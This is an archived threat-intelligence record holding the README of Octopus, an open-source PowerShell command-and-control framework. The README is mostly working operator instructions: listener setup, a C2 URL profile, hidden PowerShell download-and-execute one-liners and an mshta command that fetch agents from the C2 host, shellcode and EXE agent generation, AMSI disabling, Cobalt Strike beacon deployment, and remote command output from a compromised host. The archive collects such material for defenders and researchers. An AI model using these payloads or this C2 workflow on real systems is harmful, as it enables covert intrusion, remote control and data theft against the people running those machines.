{
    "id": "f7ac2fa3-944b-47b2-be06-f6c68fe67e00",
    "created_at": "2023-01-12T15:10:00.651894Z",
    "updated_at": "2025-03-27T02:09:18.318157Z",
    "deleted_at": null,
    "sha1_hash": "35d3681a2d02b55272045acce12eb7d877c2b189",
    "title": "2019-08-30 - Github Repository of Octopus",
    "authors": "",
    "file_creation_date": "2022-05-27T20:59:00Z",
    "file_modification_date": "2022-05-27T20:59:00Z",
    "file_size": 243946,
    "plain_text": "# mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell\n\n**github.com/mhaskar/Octopus**\n\nmhaskar\n\n## What is Octopus ? pythonpython 33\n\nOctopus is an open source, pre-operation C2 server based on python which\ncan control an Octopus powershell agent through HTTP/S.\n\nThe main purpose of creating Octopus is for use before any red team\noperation, where rather than starting the engagement with your full operational\narsenal and infrastructure, you can use Octopus first to attack the target and\ngather information before you start your actual red team operation.\n\nOctopus works in a very simple way to execute commands and exchange\ninformation with the C2 over a well encrypted channel, which makes it\ninconspicuous and undetectable from almost every AV, endpoint protection,\nand network monitoring solution.\n\nOne cool feature in Octopus is called ESA, which stands for \"Endpoint\nSituational Awareness\", which will gather some important information about the\ntarget that will help you to gain better understanding of the target network\nendpoints that you will face during your operation, thus giving you a shot to\ncustomize your real operation based on this information.\n\n\n-----\n\nOctopus is designed to be stealthy and covert while communicating with the\nC2, as it uses AES-256 by default for its encrypted channel between the\npowershell agent and the C2 server. You can also opt for using SSL/TLS by\nproviding a valid certficate for your domain and configuring the Octopus C2\nserver to use it.\n\n## Octopus key features\n\nOctopus is packed with a number of features that allows you to gain an insight\ninto your upcoming engagement before you actually need to deploy your full\naresenal or tools and techniques, such as:\n\nControl agents throught HTTP/S.\nExecute system commands.\nDownload / Upload files.\nLoad external powershell modules.\nUse encrypted channels (AES-256) between C2 and agents.\nUse inconspicuous techniques to execute commands and transfer\nresults.\nCreate custom and multiple listeners for each target.\nGenerate different types of payloads.\nSupport all windows versions with powershell 2.0 and higher.\nRun Octopus windows executable agent without touching powershell.exe\nprocess.\n**Gather information automatically from the endpoint (endpoint**\n**situational awareness) feature.**\n\n## Requirements\n\nYou can install all of Octopus' requirements via :\n\n```\npip install -r requirements.txt\n\n```\n\nYou need to install `nasm for linux and 'mingw-w64' compiler to use the`\nshellcoding feature and the spoofed args agent.\n\nYou can install nasm on Debian based distros using:\n\n```\napt install nasm\n\n```\n\nAnd you can install `mingw-w64 on Debian based distros using:`\n\n```\napt install mingw-w64\n\n```\n\nOctopus has been tested on the following operating systems:\n\n\n-----\n\nUbuntu (18.04)\nUbuntu (16.04)\nKali Linux (2019.2)\n\nYou will also need to install mono to make sure that you can compile the C#\nsource without issues.\n\nOctopus depends on mono-csc binary to compile the C# source and you can\ninstall it by the following command `apt install mono-devel which has`\nbeen tested on kali and ubuntu 16.04.\n\nyou can use Octopus without installing mono but you will not be able to\nuse `generate_exe command.`\n\nAlso please note that compling C# depends on the\n```\nSystem.Management.Automation.dll assembly with SHA1 hash\n\n```\na43ed886b68c6ee913da85df9ad2064f1d81c470.\n\n[If you encounter any issues using Octopus, feel free to file a bug report!](https://github.com/mhaskar/Octopus/issues)\n\n## Installation\n\nFirst of all make sure to download the latest version of Octopus using the\nfollowing command :\n\n```\ngit clone https://github.com/mhaskar/Octopus/\n\n```\n\nThen you need to install the requirements using the following command :\n\n```\npip install -r requirements.txt\n\n```\n\nAfter that you can start the octopus server by running the following :\n\n```\n./octopus.py\n\n```\n\nYou will by greeted with the following once you run it :\n\n\n-----\n\n```\n┌[askar@hackbook] [/opt/redteaming/Octopus]\n└──╼ $python3 octopus.py\n   ___      ___            ___      ___    \n___      ___\n   / /\\     / /\\     ___    / /\\     / /\\   \n/__/\\     / /\\\n  / /::\\    / /:/     / /\\   / /::\\    / /::\\   \\ \n\\:\\    / /:/_\n  / /:/\\:\\   / /:/     / /:/   / /:/\\:\\   / /:/\\:\\   \\\n\\:\\   / /:/ /\\\n / /:/ \\:\\  / /:/ ___  / /:/   / /:/ \\:\\  / /:/~/:/ ___ \n\\ \\:\\  / /:/ /::\\\n /__/:/ \\__\\:\\ /__/:/ / /\\ / /::\\  /__/:/ \\__\\:\\ /__/:/ /:/ /__/\\ \n\\__\\:\\ /__/:/ /:/\\:\\\n \\ \\:\\ / /:/ \\ \\:\\ / /:/ /__/:/\\:\\  \\ \\:\\ / /:/ \\ \\:\\/:/  \\ \\:\\\n/ /:/ \\ \\:\\/:/~/:/\n \\ \\:\\ /:/  \\ \\:\\ /:/ \\__\\/ \\:\\  \\ \\:\\ /:/  \\ \\::/   \\ \n\\:\\ /:/  \\ \\::/ /:/\n  \\ \\:\\/:/   \\ \\:\\/:/    \\ \\:\\  \\ \\:\\/:/   \\ \\:\\   \\ \n\\:\\/:/   \\__\\/ /:/\n  \\ \\::/    \\ \\::/     \\__\\/  \\ \\::/    \\ \\:\\   \\ \n\\::/    /__/:/\n   \\__\\/     \\__\\/           \\__\\/     \\__\\/   \n\\__\\/     \\__\\/\n          v1.2 stable !\n Octopus C2 | Control your shells\nOctopus >>\n\n## Usage\n\n```\nUsing Octopus is quite simple to use, as you just need to start a listener and\ngenerate your agent based on that listener's information.\n\nYou can generate as many listeners as you need, and then you can start\ninteracting with your agents that connect to them.\n\n### Profile setup\n\nBefore you can start using Octopus you have to setup a URL handling profile\nwhich will control the C2 behavior and functions, as Octopus is an HTTP based\nC2 thus it depends on URLs to handle the connections and to guarantee that\n\n\n-----\n\nthe URLs will not serve as a signatures or IoC in the network you are currently\nattacking, the URLs can be easily customized and renamed as needed.\n\nProfile setup currently only support URL handling, auto kill value and\nheaders.\n\n**Setting up your profile**\n\nTo start setting up your profile you need to edit the `profile.py file, which`\ncontains a number of key variables, which are:\n\nfile_reciever_url: handles file downloading.\nreport_url: handle ESA reports.\ncommand_send_url: handles the commands that will be sent to the\ntarget.\ncommand_receiver_url: handles commands will be executed on the\ntarget.\nfirst_ping_url: handles the first connection from the target.\nserver_response_header: this header will show in every response.\nauto_kill: variable to control when the agent will be killed after N failed\nconnections with the C2\n\nExample:\n\n\n-----\n\n```\n#!/usr/bin/python3\n# this is the web listener profile for Octopus C2\n# you can customize your profile to handle a specific URLs to communicate\nwith the agent\n# TODO : add the ability to customize the request headers\n# handling the file downloading\n# Ex : /anything\n# Ex : /anything.php\nfile_receiver_url = \"/messages\"\n# handling the report generation\n# Ex : /anything\n# Ex : /anything.php\nreport_url = \"/calls\"\n# command sending to agent (store the command will be executed on a host)\n# leave <hostname> as it with the same format\n# Ex : /profile/<hostname>\n# Ex : /messages/<hostname>\n# Ex : /bills/<hostname>\ncommand_send_url = \"/view/<hostname>\"\n# handling the executed command\n# Ex : /anything\n# Ex : /anything.php\ncommand_receiver_url = \"/bills\"\n# handling the first connection from the agent\n# Ex : /anything\n# Ex : /anything.php\nfirst_ping_url = \"/login\"\n# will return in every response as Server header\nserver_response_header = \"nginx\"\n# will return white page that includes HTA script\nmshta_url = \"/hta\"\n# auto kill value after n tries\nauto_kill = 10\n\n```\nThe agent and the listeners will be configured to use this profile to\ncommunicate with each other. Next we need to know how to create a listener.\n\n### Listeners\n\n\n-----\n\nOctopus has two main listeners, http listener and https listener, and the\noptions of the two listeners are mostly identical.\n\n**HTTP listener :**\n```\nlisten_http command takes the following arguments to start:\n\n```\nBindIP Defines the IP address that will be used by the listener.\nBindPort Defines the port you want to listen on.\nHostname Will be used to request the payload from.\nInterval How number of seconds the agent will wait before checking for\ncommands.\nURL The name of the page hosting the payload.\nListener_name Listener name to use.\n\nyou can also view an example of it by running the `listen_http command:`\n```\nOctopus >>listen_http\n[-] Please check listener arguments !\nSyntax : listen_http BindIP BindPort hostname interval URL listener_name\nExample (with domain) : listen_http 0.0.0.0 8080 myc2.live 5 comments.php\nop1_listener\nExample (without domain) : listen_http 0.0.0.0 8080 172.0.1.3 5\nprofile.php op1_listener\n##########\nOptions info :\nBindIP  IP address that will be used by the listener\nBindPort  port you want to listen on\nHostname  will be used to request the payload from\nInterval  how may seconds that agent will wait before check\nfor commands\nURL  page name will hold the payload\nListener_name  listener name to use\nOctopus >>\n\n```\nAnd we can start a listener using the following command :\n\n```\nlisten_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1\n\n```\n\nThe following result will be returned:\n\n\n-----\n\n```\nOctopus >>listen_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1\nOctopus >> * Serving Flask app \"core.weblistener\" (lazy loading)\n * Environment: production\n  WARNING: Do not use the development server in a production\nenvironment.\n  Use a production WSGI server instead.\n * Debug mode: off\nOctopus >>\n\n```\na listener has been started successfully, and we can view all the listeners using\nthe `listeners command:`\n```\nOctopus >>listeners\nName    IP     Port Host       Interval Path   SSL\n---------- ------- ------ ------------- ---------- -------- ----operation1 0.0.0.0  8080 192.168.178.1      5 page.php False\nOctopus >>\n\n```\n**HTTPS listener :**\n\nTo create an HTTPS listener you can use `listen_https command as such:`\n```\nOctopus >>listen_https\n[-] Please check listener arguments !\nSyntax : listen_https BindIP BindPort hostname interval URL\nlistener_name certficate_path key_path\nExample (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php\nop1_listener certs/cert.pem certs/key.pem\nOctopus >>listen_https 0.0.0.0 443 myc2.live 5 login.php\ndarkside_operation certs/cert.pem certs/key.pem\nSSL listener started !\n[+]darkside_operation Listener has been created\nOctopus >> * Serving Flask app \"core.weblistener\" (lazy loading)\n * Environment: production\n  WARNING: Do not use the development server in a production\nenvironment.\n  Use a production WSGI server instead.\n * Debug mode: off\nOctopus >>\n\n```\nThe `listen_https command takes the following arguments to start:`\n\nBindIP : which is the IP address that will be used by the listener\nBindPort : which is the port you want to listen on\nHostname : will be used to request the payload from\nInterval : how may seconds that agent will wait before check for\ncommands\n\n\n-----\n\nURL page : name will hold the payload\nListener_name : listener name to use\ncertficate_path : path for valid ssl certficate (called fullchain.pem for\nletsencrypt certficates)\nkey_path : path for valid key for the ssl cerficate (called key.pem for\nletsencrypt certficates)\n\nPlease note that you need to provide a valid SSL certficate that is associated\nwith the domain used.\n\n### Generate agents\n\n**Powershell oneliner**\n\nTo generate an agent for the listener `operation1 we can use the following`\ncommand:\n\n```\ngenerate_powershell operation1\n\n```\n\nand we will get the following result:\n```\nOctopus >>generate_powershell operation1\n#====================\n1) powershell -w hidden \"IEX (New-Object\nNet.WebClient).DownloadString('http://192.168.178.1:8080/page.php');\"\n2) powershell -w hidden \"Invoke-Expression (New-Object\nNet.WebClient).DownloadString('http://192.168.178.1:8080/page.php');\"\n3) powershell -w hidden \"$w = (New-Object\nNet.WebClient).DownloadString('http://192.168.178.1:8080/page.php');Invoke\nExpression $w;\"\nNote - For Windows 7 clients you may need to prefix the payload with\n\"Add-Type -AssemblyName System.Core;\"\n    e.g. powershell -w hidden \"Add-Type -AssemblyName System.Core;IEX\n(New-Object\nNet.WebClient).DownloadString('http://192.168.178.1:8080/page.php');\"\nHack your way in ;)\n#====================\nOctopus >>\n\n```\nNow we can use this oneliner to start our agent.\n\n**HTA oneliner**\n\nTo generate a HTA oneliner for the listener1 `operation1 we can use the`\nfollowing command:\n\n\n-----\n\n```\ngenerate_hta operation1\n\n```\n\nand we will get the following results:\n```\nOctopus >>generate_hta operation1\n#====================\nmshta http://192.168.178.1:8080/hta\nspread it and wait ;)\n#====================\nOctopus >>\n\n```\nPlease note that you can edit the `/hta URL using` `profile.py`\n\n**Octopus EXE agent**\n\nTo generate an EXE agent for listener `operation1 we can use the following`\ncommand:\n\n```\ngenerate_unmanaged_exe operation1 /opt/Octopus/file.exe\n\n```\n\nand we will get the following result:\n```\nOctopus >>generate_unmanaged_exe darkside_operation2\n/opt/Octopus/file.exe\n[+] file compiled successfully !\n[+] binary file saved to /opt/Octopus/file.exe\nOctopus >>\n\n```\nPlease note that you have to install mono-csc to compile the C# source.\n\n**_Octopus Spoofed arguments agent_**\n\nYou can generate a new EXE agent that will run a Powershell process with\n[spoofed arguments based on Adam Chester's brilliant research.](https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/)\n\nTo generate this exe, you can use the following command:\n```\nOctopus >>generate_spoofed_args_exe\n[-] Please select a listener and check your options !\nSyntax : generate_spoofed_args_exe listener_name output_path\nExample : generate_spoofed_args_exe listener1 /opt/Octopus/file.exe\nOctopus >>\n\n```\n**_Generate x64 shellcode and x86 shellcode_**\n\nOctopus can generate both x64 and x86 shellcode starting from version 1.2,\nthe generated shellcode is using CreateProcessA to start powershell.exe\noneliner that will launch powershell agent.\n\nTo generate x64 shellcode, you can use the following command:\n\n\n-----\n\n```\nOctopus >>generate_x64_shellcode\n[-] Please select a listener and check your options !\nSyntax : generate_x64_shellcode listener_name\nExample : generate_x64_shellcode listener1\nOctopus >>\n\n```\nTo generate x86 shellcode, you can use the following command:\n```\nOctopus >>generate_x86_shellcode\n[-] Please select a listener and check your options !\nSyntax : generate_x86_shellcode listener_name\nExample : generate_x86_shellcode listener1\nOctopus >>\n\n### Interacting with agents\n\n```\nFirst of all you can list all connected agents using the `list command to get`\nthe following results:\n```\nOctopus >>list\n Session IP      Hostname    PID Username    Domain    \nLast ping         OS\n--------- ------------ ----------- ----- ------------- ------------ \n------------------------ -------------------------------    1 192.168.1.43 HR-PC-TYRMJ 10056 hr-pc\\labuser darkside.com \nTue Sep 3 10:22:07 2019 Microsoft Windows 10 Pro(64-bit)\nOctopus >>\n\n```\nAnd then we can use the `interact command to interact with the host as`\nfollows:\n```\nOctopus >>list\n Session IP      Hostname    PID Username    Domain    \nLast ping         OS\n--------- ------------ ----------- ----- ------------- ------------ \n------------------------ -------------------------------    1 192.168.1.43 HR-PC-TYRMJ 10056 hr-pc\\labuser darkside.com \nTue Sep 3 10:22:07 2019 Microsoft Windows 10 Pro(64-bit)\nOctopus >>interact 1\n(HR-PC-TYRMJ) >>\n\n```\nYou can list all the available commands using the `help command like the`\nfollowing:\n\n\n-----\n\n```\nOctopus >>list\n Session IP      Hostname    PID Username    Domain    \nLast ping         OS\n--------- ------------ ----------- ----- ------------- ------------ \n------------------------ -------------------------------    1 192.168.1.43 HR-PC-TYRMJ 10056 hr-pc\\labuser darkside.com \nTue Sep 3 10:22:07 2019 Microsoft Windows 10 Pro(64-bit)\nOctopus >>interact 1\n(HR-PC-TYRMJ) >> help\nAvailable commands to use :\nHint : if you want to execute system command just type it and wait for\nthe results\n+++++++++\nhelp   show this help menu\nexit/back  exit current session and back to the main\nscreen\nclear  clear the screen output\ndownload  download file from the target machine\ndeploy_cobalt_beacon  deploy cobalt strike powershell beacon in\nthe current process\nload  load powershell module to the target\nmachine\ndisable_amsi  disable AMSI on the target machine\nreport  get situation report from the target\n(HR-PC-TYRMJ) >>\n\n```\nTo execute a system command directly we can type the command directly and\nthen wait for the results based on the interval check time that we set when we\ncreated the listener.\n\n\n-----\n\n```\n(HR PC TYRMJ) >> ipconfig\n[+] Command sent, waiting for results\n(HR-PC-TYRMJ) >>\nCommand execution result is :\nWindows IP Configuration\nEthernet adapter Ethernet1:\n  Media State . . . . . . . . . . . : Media disconnected\n  Connection-specific DNS Suffix . :\nEthernet adapter Ethernet0:\n  Connection-specific DNS Suffix . : home\n  Link-local IPv6 Address . . . . . : fe80::f85f:d52b:1d8d:cbae%10\n  IPv4 Address. . . . . . . . . . . : 192.168.1.43\n  Subnet Mask . . . . . . . . . . . : 255.255.255.0\n  Default Gateway . . . . . . . . . : 192.168.1.1\nEthernet adapter Ethernet:\n  Media State . . . . . . . . . . . : Media disconnected\n  Connection-specific DNS Suffix . :\nEthernet adapter Bluetooth Network Connection:\n  Media State . . . . . . . . . . . : Media disconnected\n  Connection-specific DNS Suffix . :\n(HR-PC-TYRMJ) >>\n\n```\nIn this case the command has been encrypted and then sent to the agent, after\nthat the client will decrypt the command and execute it, the agent will encrypt\nthe results, and finally send it back again to the C2 to decrypt it and show the\nresults.\n\nWe can also use the `report command to get the ESA information like the`\nfollowing:\n\n\n-----\n\n```\n(HR PC TYRMJ) >> report\n[+] Command sent, waiting for results\n(HR-PC-TYRMJ) >>\nEndpoint situation awareness report for HR-PC-QNGAV\n=============\nHostname :  HR-PC-QNGAV\nDomain :  darkside.com\nOS :  Microsoft Windows 10 Pro(64-bit)\nOS build :  10.0.17134\nOS arch :  64-bit\nAntiVirus :  Symantec\nSIEM solution : False\nInternal interfaces/IPs :\n     IP : 192.168.178.144\n     IP : 172.12.1.20\nDevice language : en-US\nDevice uptime : 41.6386169797778 hours\nDevice local time : 21:55(09/09/2019)\n(HR-PC-TYRMJ) >>\n\n```\nYou can load an external powershell module by placing it in the `modules`\ndirectory, then executing `load module.ps1 .`\n\nAlso you can list all of the modules in the modules directory by executing the\n```\nmodules command like so:\n(HR-PC-TYRMJ) >> modules\nPowerView.ps1\n(HR-PC-TYRMJ) >> load PowerView.ps1\n[+] Module should be loaded !\n(HR-PC-TYRMJ) >>\n\n## More about Octopus\n\n```\n[Octopus v1.0 stable: Cobalt Strike deployment & much more!](https://shells.systems/octopus-v1-0-stable-cobalt-strike-deployment-much-more)\n\n[Unveiling Octopus: The pre-operation C2 for Red Teamers](https://shells.systems/unveiling-octopus-the-pre-operation-c2-for-red-teamers/)\n\n## Credits\n\n[Ian Lyte for reporting multiple bugs in Octopus and pushing an enhanced](https://twitter.com/Bb_hacks)\nAMSI bypass module.\n\n[Khlief for adding HTA module and fix a bug in download feature](https://github.com/ahmedkhlief)\n\n\n-----\n\n[Moath Maharmah for enhancing the encryption module and writing a](https://twitter.com/iomoaaz)\nstandalone C# Octopus agent which will be added to the upcoming\nrelease.\n\n[TeslaPulse for testing Octopus](https://github.com/TeslaPulse/)\n\n[J005 for adding enhanced Powershell oneliner and fix an issue in the HID](https://github.com/iomoath)\nattack script.\n\n## License\n\nThis project is licensed under the GPL-3.0 License - see the LICENSE file for\ndetails\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-30 - Github Repository of Octopus.pdf"
    ],
    "report_names": [
        "2019-08-30 - Github Repository of Octopus.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536200,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653685140,
    "ts_modification_date": 1653685140,
    "files": {
        "pdf": "https://archive.orkl.eu/35d3681a2d02b55272045acce12eb7d877c2b189.pdf",
        "text": "https://archive.orkl.eu/35d3681a2d02b55272045acce12eb7d877c2b189.txt",
        "img": "https://archive.orkl.eu/35d3681a2d02b55272045acce12eb7d877c2b189.jpg"
    }
}